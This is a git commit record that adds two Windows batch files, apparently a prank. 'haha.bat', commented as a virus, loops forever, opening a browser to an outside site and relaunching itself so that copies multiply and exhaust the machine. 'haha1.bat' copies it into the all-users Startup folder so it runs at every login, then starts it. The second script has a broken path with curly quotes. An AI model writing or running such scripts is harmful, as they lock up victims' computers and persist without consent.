a7e8a561c6caac4e8a74f80d1e60e7cfa1cfb4ee
chunky-funky <83296034+chunky-funky@users.noreply.github.com>
2021-04-27 11:23:56 -0400

    .bat files upload
    well they should to be here right?

---
+++ haha.bat
@@ -0,0 +1,6 @@
+@echo off
+Rem this is a virus
+:a
+start "iexplore.exe" http://ukraine.net
+start haha.bat
+goto a
---
+++ haha1.bat
@@ -0,0 +1,4 @@
+@echo off
+move haha.bat C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
+cd “C:\ProgramData\Microsoft\Windows\Start\Menu\Programs\StartUp”
+start haha.bat
